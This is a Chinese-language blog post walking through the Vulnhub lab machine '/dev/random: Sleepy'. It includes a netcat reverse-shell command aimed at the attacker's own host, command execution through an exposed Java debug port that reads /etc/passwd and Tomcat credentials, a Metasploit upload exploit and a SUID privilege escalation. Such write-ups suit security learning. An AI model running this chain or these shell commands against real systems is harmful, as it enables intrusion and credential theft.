
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>/dev/random: Sleepy - tick.Tack</title>
  <meta name="author" content="DMC">

  
  <meta name="description" content="/dev/random: Sleepy from Vulnhub nmap掃描結果如下 root@kali:~/Security/sleepy# nmap -n -T5 192.168.0.117 --top-ports=5000 -A Starting Nmap 6.49BETA4 ( &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://newdominic.github.io/blog/2015/12/20/sleepy/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="tick.Tack" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">tick.Tack</a></h1>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="sitesearch" value="newdominic.github.io">
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
  <li><a href="/about">About</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">/dev/random: Sleepy</h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-12-20T16:57:45+08:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>20</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>4:57 pm</span></time>
        
      </p>
    
  </header>


<div class="entry-content"><p><a href="https://www.vulnhub.com/entry/devrandom-sleepy,123/">/dev/random: Sleepy</a> from <a href="https://www.vulnhub.com/">Vulnhub</a></p>

<!--more-->


<hr />

<p>nmap掃描結果如下</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/sleepy# nmap -n -T5 192.168.0.117 --top-ports<span class="o">=</span><span class="m">5000</span> -A

Starting Nmap 6.49BETA4 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2015-12-19 23:46 CST
Warning: 192.168.0.117 giving up on port because retransmission cap hit <span class="o">(</span>2<span class="o">)</span>.
Nmap scan report <span class="k">for</span> 192.168.0.117
Host is up <span class="o">(</span>0.00032s latency<span class="o">)</span>.
Not shown: <span class="m">4250</span> filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
<span class="p">|</span> ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
<span class="p">|</span>_Can<span class="err">&#39;</span>t get directory listing: TIMEOUT
8009/tcp open  ajp13   Apache Jserv <span class="o">(</span>Protocol v1.3<span class="o">)</span>
<span class="p">|</span>_ajp-methods: Failed to get a valid response <span class="k">for</span> the OPTION request
9001/tcp open  jdwp    Java Debug Wire Protocol <span class="o">(</span>Reference Implementation<span class="o">)</span> version 1.6 1.7.0_71
MAC Address: 08:00:27:79:0F:C3 <span class="o">(</span>Cadmus Computer Systems<span class="o">)</span>
Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
Device <span class="nb">type</span>: general purpose
Running: Linux 2.6.X<span class="p">|</span>3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
Network Distance: <span class="m">1</span> hop

TRACEROUTE
HOP RTT     ADDRESS
<span class="m">1</span>   0.31 ms 192.168.0.117

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 58.34 seconds</code></pre></div>


<p>用anonymous登入ftp後只拿到一張看起來沒有線索的jpg檔，暫時先放到一邊</p>

<p>另外還開了兩個還沒遇過的port，用nc連過去都沒甚麼回應，先google一下一般開啟這兩個port的用途</p>

<p>port 8009大部分的用途是，<a href="https://en.wikipedia.org/wiki/Apache_JServ_Protocol">Apache JServ Protocol</a></p>

<p>說不定自己架一個apache server再proxy過去就能看到網頁了</p>

<p>不過要使用這個功能必須先安裝 libapache2-mod-jk</p>

<p>安裝後再<a href="https://rimuhosting.com/mod_jk2_and_mod_proxy_ajp.jsp">設定</a>讓自己的Apache Server proxy到目標ip後，用瀏覽器就能看到架好的Tomcat Server了</p>

<p><img class="center" src="/images/2015-12-20-sleepy/tomcat.png"></p>

<p>連上後先嘗試登入tomcat的管理介面</p>

<p>不過試了很多組密碼都沒有用，用dirbuster也沒找到可疑的目錄，只能暫時擱置，來看另一個開啟的port</p>

<p>port 9001通常用於<a href="http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/jdwp-spec.html">Java Debug Wire Protocol</a>，可以讓使用者遠端debug JVM</p>

<p>首先找到這篇<a href="http://blog.ioactive.com/2014/04/hacking-java-debug-wire-protocol-or-how.html">文章</a>，大意是可以透過連入JDWP達到Remote code execution的效果</p>

<p>不過實際拿他的exploit來用(metasploit其實也有內建exploit了)，發現很難猜到目標有使用的物件，繼續再找找有沒有替代方案</p>

<p>再來找到<a href="https://www.exploit-db.com/papers/27179/">這篇</a>：直接用jdb attach到目標後中斷程式，藉由建立新的物件達到執行命令的效果</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/sleepy# jdb -attach 192.168.0.117:9001
Set uncaught java.lang.Throwable
Set deferred uncaught java.lang.Throwable
Initializing jdb ...
&gt;</code></pre></div>


<p>很順利地連上之後，先想辦法讓程式中斷</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">&gt; threads
Group system:
  <span class="o">(</span>java.lang.ref.Reference<span class="nv">$ReferenceHandler</span><span class="o">)</span>0x19d Reference Handler cond. waiting
  <span class="o">(</span>java.lang.ref.Finalizer<span class="nv">$FinalizerThread</span><span class="o">)</span>0x19e  Finalizer         cond. waiting
  <span class="o">(</span>java.lang.Thread<span class="o">)</span>0x19f                         Signal Dispatcher running
Group main:
  <span class="o">(</span>java.lang.Thread<span class="o">)</span>0x1a1                         main              sleeping
&gt; interrupt 0x1a1
&gt;
Exception occurred: java.lang.InterruptedException <span class="o">(</span>uncaught<span class="o">)</span><span class="s2">&quot;thread=main&quot;</span>, java.lang.Thread.sleep<span class="o">()</span>, <span class="nv">line</span><span class="o">=</span>-1 <span class="nv">bci</span><span class="o">=</span>-1

main<span class="o">[</span>1<span class="o">]</span></code></pre></div>


<p>來試試讓目標彈一個reverse shell回來</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">main<span class="o">[</span>1<span class="o">]</span>  print new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">&quot;nc 192.168.0.115 12345 -e /bin/sh&quot;</span><span class="o">)</span>                                         com.sun.tools.example.debug.expr.ParseException: Unable to create java.lang.Runtime instance
 new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">&quot;nc 192.168.0.115 12345 -e /bin/sh&quot;</span><span class="o">)</span> <span class="o">=</span> null</code></pre></div>


<p>失敗。接著換其他指令試試看</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">main<span class="o">[</span>1<span class="o">]</span> print new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">&quot;cat /etc/passwd&quot;</span><span class="o">)</span>
 new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">&quot;cat /etc/passwd&quot;</span><span class="o">)</span> <span class="o">=</span> <span class="s2">&quot;java.lang.UNIXProcess@6a059fa4&quot;</span></code></pre></div>


<p>看起來有成功產生物件，但卻看不到內容，稍微研究一下要怎麼<a href="http://stackoverflow.com/questions/4741878/redirect-runtime-getruntime-exec-output-with-system-setout">顯示exec的輸出</a>，拼湊出了下面這難看的解法</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">main<span class="o">[</span>1<span class="o">]</span> print new java.lang.String<span class="o">(</span>new java.io.BufferedReader<span class="o">(</span>new java.io.InputStreamReader<span class="o">(</span>new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">&quot;cat /etc/passwd&quot;</span><span class="o">)</span>.getInputStream<span class="o">()))</span>.readLine<span class="o">())</span>
 new java.lang.String<span class="o">(</span>new java.io.BufferedReader<span class="o">(</span>new java.io.InputStreamReader<span class="o">(</span>new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">&quot;cat /etc/passwd&quot;</span><span class="o">)</span>.getInputStream<span class="o">()))</span>.readLine<span class="o">())</span> <span class="o">=</span> <span class="s2">&quot;root:x:0:0:root:/root:/bin/bash&quot;</span></code></pre></div>


<p>但是用這方法實在很難操作，後來想到可以找看看tomcat的管理帳密</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">main<span class="o">[</span>1<span class="o">]</span> print new java.lang.String<span class="o">(</span>new java.io.BufferedReader<span class="o">(</span>new java.io.InputStreamReader<span class="o">(</span>new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">&quot;tail -n 1 /etc/tomcat/tomcat-users.xml&quot;</span><span class="o">)</span>.getInputStream<span class="o">()))</span>.readLine<span class="o">())</span>
 new java.lang.String<span class="o">(</span>new java.io.BufferedReader<span class="o">(</span>new java.io.InputStreamReader<span class="o">(</span>new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">&quot;tail -n 1 /etc/tomcat/tomcat-users.xml&quot;</span><span class="o">)</span>.getInputStream<span class="o">()))</span>.readLine<span class="o">())</span> <span class="o">=</span> <span class="s2">&quot;&lt;/tomcat-users&gt;&quot;</span>
main<span class="o">[</span>1<span class="o">]</span> print new java.lang.String<span class="o">(</span>new java.io.BufferedReader<span class="o">(</span>new java.io.InputStreamReader<span class="o">(</span>new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">&quot;tail -n 2 /etc/tomcat/tomcat-users.xml&quot;</span><span class="o">)</span>.getInputStream<span class="o">()))</span>.readLine<span class="o">())</span>
 new java.lang.String<span class="o">(</span>new java.io.BufferedReader<span class="o">(</span>new java.io.InputStreamReader<span class="o">(</span>new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">&quot;tail -n 2 /etc/tomcat/tomcat-users.xml&quot;</span><span class="o">)</span>.getInputStream<span class="o">()))</span>.readLine<span class="o">())</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
main<span class="o">[</span>1<span class="o">]</span> print new java.lang.String<span class="o">(</span>new java.io.BufferedReader<span class="o">(</span>new java.io.InputStreamReader<span class="o">(</span>new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">&quot;tail -n 3 /etc/tomcat/tomcat-users.xml&quot;</span><span class="o">)</span>.getInputStream<span class="o">()))</span>.readLine<span class="o">())</span>
 new java.lang.String<span class="o">(</span>new java.io.BufferedReader<span class="o">(</span>new java.io.InputStreamReader<span class="o">(</span>new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">&quot;tail -n 3 /etc/tomcat/tomcat-users.xml&quot;</span><span class="o">)</span>.getInputStream<span class="o">()))</span>.readLine<span class="o">())</span> <span class="o">=</span> <span class="s2">&quot;&lt;user username=&quot;</span>sl33py<span class="s2">&quot; password=&quot;</span>Gu3SSmYStR0NgPa<span class="nv">$sw0rD</span>!<span class="s2">&quot; roles=&quot;</span>tomcat,manager-gui,admin-gui,admin,manager-jmx,admin-script,manager,manager-script,manager-status<span class="s2">&quot;/&gt;&quot;</span></code></pre></div>


<p>帳號是 sl33py，密碼是 Gu3SSmYStR0NgPa$sw0rD。成功登入tomcat管理介面！</p>

<p><img class="center" src="/images/2015-12-20-sleepy/manager.png"></p>

<p>前面在研究tomcat密碼設定的過程中看到一篇<a href="http://roach0426.pixnet.net/blog/post/965149-tomcat%E5%85%A5%E4%BE%B5%E6%94%BB%E9%98%B2%E6%88%B0">文章</a>：有人的伺服器被打入管理介面後塞了一個.war檔進去。</p>

<p>所以就先從file upload+code execution的方向去找exploit</p>

<p>在kali下用searchsploit找看看</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~# searchsploit tomcat  <span class="p">|</span>  grep Upload
Apache Tomcat Manager - Application Upload Authenticated Code Execution                       <span class="p">|</span> ./multiple/remote/31433.rb
Apache Commons FileUpload and Apache Tomcat - Denial-of-Service                               <span class="p">|</span> ./multiple/dos/31615.rb</code></pre></div>


<p>第一個看起來有點像是我們想要東西，而要實際操作這個exploit必須要使用metasploit</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~# msfconsole -q
msf &gt; search tomcat
...
exploit/multi/http/tomcat_mgr_upload                         2009-11-09       excellent  Apache Tomcat Manager Authenticated Upload Code Execution
msf &gt; use exploit/multi/http/tomcat_mgr_upload
msf exploit<span class="o">(</span>tomcat_mgr_upload<span class="o">)</span> &gt;</code></pre></div>


<p>設定好之後用show options檢查一下</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">PASSWORD   Gu3SSmYStR0NgPa<span class="nv">$sw0rD</span>!  no        The password <span class="k">for</span> the specified username
  Proxies                            no        A proxy chain of format <span class="nb">type</span>:host:port<span class="o">[</span>,type:host:port<span class="o">][</span>...<span class="o">]</span>
  RHOST      127.0.0.1               yes       The target address
  RPORT      <span class="m">80</span>                      yes       The target port
  TARGETURI  /manager                yes       The URI path of the manager app <span class="o">(</span>/html/upload and /undeploy will be used<span class="o">)</span>
  USERNAME   sl33py                  no        The username to authenticate as
  VHOST                              no        HTTP server virtual host</code></pre></div>


<p>設定沒問題就給他run下去！成功拿到meterpreter的shell！</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">msf exploit<span class="o">(</span>tomcat_mgr_upload<span class="o">)</span> &gt; run

<span class="o">[</span>*<span class="o">]</span> Started reverse handler on 192.168.0.115:12333
<span class="o">[</span>*<span class="o">]</span> 127.0.0.2:80 - Retrieving session ID and CSRF token...
<span class="o">[</span>*<span class="o">]</span> 127.0.0.2:80 - Uploading and deploying 9Vw90ot2DD7eS...
<span class="o">[</span>*<span class="o">]</span> 127.0.0.2:80 - Executing 9Vw90ot2DD7eS...
<span class="o">[</span>*<span class="o">]</span> 127.0.0.2:80 - Undeploying 9Vw90ot2DD7eS ...
<span class="o">[</span>*<span class="o">]</span> Transmitting intermediate stager <span class="k">for</span> over-sized stage...<span class="o">(</span><span class="m">105</span> bytes<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">1495598</span> bytes<span class="o">)</span> to 192.168.0.117
<span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span>192.168.0.115:12333 -&gt; 192.168.0.117:37622<span class="o">)</span> at 2015-12-21 00:25:56 +0800

meterpreter &gt;</code></pre></div>


<p>稍微研究一下目標電腦，會知道裡面有個叫sleepy的使用者，而且有個能夠以tomcat身分執行的suid程式</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">sh-4.2<span class="nv">$ </span>cat /etc/passwd
...
sleepy:x:1002:1002::/home/sleepy:/bin/bash
sh-4.2<span class="nv">$ </span><span class="k">for</span> i in <span class="k">$(</span>find / -perm -4000 2&gt;/dev/null<span class="k">)</span><span class="p">;</span> <span class="k">do</span> ls -al <span class="nv">$i</span><span class="p">;</span> <span class="k">done</span>
...
-rwsr-s---. <span class="m">1</span> root tomcat <span class="m">8669</span> Jan <span class="m">18</span>  <span class="m">2015</span> /usr/bin/nightmare</code></pre></div>


<p>而實際執行後會跳出錯誤訊息</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">sh-4.2<span class="nv">$ </span>/usr/bin/nightmare
<span class="o">[</span>-<span class="o">]</span> error: no tty present</code></pre></div>


<p>要tty是吧，試試看能不能用pty<a href="http://stackoverflow.com/questions/1401002/trick-an-application-into-thinking-its-stdin-is-interactive-not-a-pipe">騙一下</a></p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">sh-4.2<span class="nv">$ </span>python -c <span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;);&#39;</span>
bash-4.2<span class="nv">$ </span>/usr/bin/nightmare
/usr/bin/nightmare
Error opening terminal: unknown.
<span class="o">[</span>+<span class="o">]</span> Again <span class="o">[</span>y/n<span class="o">]</span>?</code></pre></div>


<p>看來不能用騙的，最後只好把程式丟回kali分析看看</p>

<p>程式的架構大概是像下面這樣</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">void main<span class="o">()</span>
<span class="o">{</span>
    memset<span class="o">(</span>var_a, 0x0, 0x98<span class="o">)</span><span class="p">;</span>
    sigaction<span class="o">(</span>0x2, 0x40081f, 0<span class="o">)</span><span class="p">;</span>
    sigaction<span class="o">(</span>0xf, 0x40081f, 0<span class="o">)</span><span class="p">;</span>
    <span class="k">if</span> <span class="o">(</span>open<span class="o">(</span><span class="s2">&quot;/dev/tty&quot;</span>, 0x2<span class="o">)</span> <span class="o">==</span> -1<span class="o">)</span> <span class="o">{</span>
        puts <span class="o">(</span><span class="s2">&quot;[-] error: no tty present&quot;</span><span class="o">)</span><span class="p">;</span>
    <span class="o">}</span>
    <span class="k">else</span> <span class="o">{</span>
        fire<span class="o">()</span><span class="p">;</span>
        <span class="k">while</span> <span class="o">(</span>1<span class="o">)</span> <span class="o">{</span>
            <span class="nb">printf</span> <span class="o">(</span><span class="s2">&quot;[+] Again [y/n]?&quot;</span><span class="o">)</span><span class="p">;</span>
            <span class="nv">var_b</span> <span class="o">=</span> getchar <span class="o">()</span><span class="p">;</span>
            <span class="k">if</span> <span class="o">(</span><span class="nv">var_b</span> <span class="o">==</span> <span class="s1">&#39;y&#39;</span> or <span class="nv">var_b</span> <span class="o">==</span> <span class="s1">&#39;Y&#39;</span><span class="o">)</span> <span class="o">{</span>
                fire<span class="o">()</span><span class="p">;</span>
            <span class="o">}</span>
            <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="nv">var_b</span> <span class="o">==</span> <span class="s1">&#39;n&#39;</span> <span class="o">||</span> <span class="nv">var_b</span> <span class="o">==</span> <span class="s1">&#39;N&#39;</span><span class="o">)</span> <span class="o">{</span>
                puts <span class="o">(</span><span class="s2">&quot;Oops.. &#39;n&#39; is broken&quot;</span><span class="o">)</span><span class="p">;</span>
            <span class="o">}</span>
        <span class="o">}</span><span class="p">;</span>
    <span class="o">}</span>
<span class="o">}</span>

void fire <span class="o">()</span>
<span class="o">{</span>
    system<span class="o">(</span><span class="s2">&quot;/usr/bin/aafire&quot;</span><span class="o">)</span><span class="p">;</span>
<span class="o">}</span></code></pre></div>


<p>再來是sigaction所指定的函式</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">void sigHandler <span class="o">()</span>
<span class="o">{</span>
    train<span class="o">()</span><span class="p">;</span>
    <span class="nb">exit</span><span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
<span class="o">}</span>

void train <span class="o">()</span>
<span class="o">{</span>
    setresuid <span class="o">(</span>0, 0, 0, 0<span class="o">)</span><span class="p">;</span>
    setresgid <span class="o">(</span>0, 0, 0, 0<span class="o">)</span><span class="p">;</span>
    system <span class="o">(</span><span class="s2">&quot;/usr/bin/sl -al&quot;</span><span class="o">)</span><span class="p">;</span>
<span class="o">}</span></code></pre></div>


<p>既然用到了setresuid和setresgid，看來是希望我們對/usr/bin/sl操作來達到提權的目的</p>

<p>花了一段時間，最後用&#8221;replace path to binary&#8221;當關鍵字找到一個神奇的<a href="http://serverfault.com/questions/548320/override-path-to-binary-for-particular-user">解法</a></p>

<p>程式內用sigaction設定了當遇到SIGINT(0x2)和SIGTERM(0xf)時要進入sigHandler</p>

<p>不過因為現在是用meterpreter建的shell，如果下Ctrl+C的話，SIGINT指令會被meterpreter吃掉</p>

<p>只能再建另一個session，用kill -2或-15把signal送出後就拿到root了</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bash-4.2<span class="nv">$ </span>/usr/bin/nightmare
/usr/bin/nightmare
Error opening terminal: unknown.
<span class="o">[</span>+<span class="o">]</span> Again <span class="o">[</span>y/n<span class="o">]</span>? bash-4.2# id
id
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,91<span class="o">(</span>tomcat<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>system_u:system_r:tomcat_t:s0
bash-4.2#</code></pre></div>


<p>/root/flag.txt是超佔畫面的的七個小矮人，就不放了</p>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">DMC</span></span>

      




<time class='entry-date' datetime='2015-12-20T16:57:45+08:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>20</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>4:57 pm</span></time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/boot2root/'>boot2root</a>, <a class='category' href='/blog/categories/vulnhub/'>vulnhub</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://newdominic.github.io/blog/2015/12/20/sleepy/" data-via="newdominic" data-counturl="http://newdominic.github.io/blog/2015/12/20/sleepy/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2015/12/19/the_wall_1/" title="Previous Post: The Wall: 1">&laquo; The Wall: 1</a>
      
      
        <a class="basic-alignment right" href="/blog/2015/12/23/pipe/" title="Next Post: /dev/random: Pipe">/dev/random: Pipe &raquo;</a>
      
    </p>
  </footer>
</article>

</div>

<aside class="sidebar">
  
    <section>
  <p><a href="https://facebook.com/newdominic"><img src="/images/facebook.png" width="30" height="30"></a>
<a href="https://twitter.com/newdominic"><img src="/images/twitter.png" width="30" height="30"></a></p>
</section>
<section>
  <h1>Recent posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2016/06/18/vulnosv2/">VulnOSv2</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/06/18/Milnet_1/">Milnet: 1</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/06/17/stapler_1/">Stapler: 1</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/05/03/google_advanced_search_operators/">Google Adavanced Search Operators</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/12/26/lord_of_root/">Lord of the Root</a>
      </li>
    
  </ul>
</section>

  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2016 - DMC -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
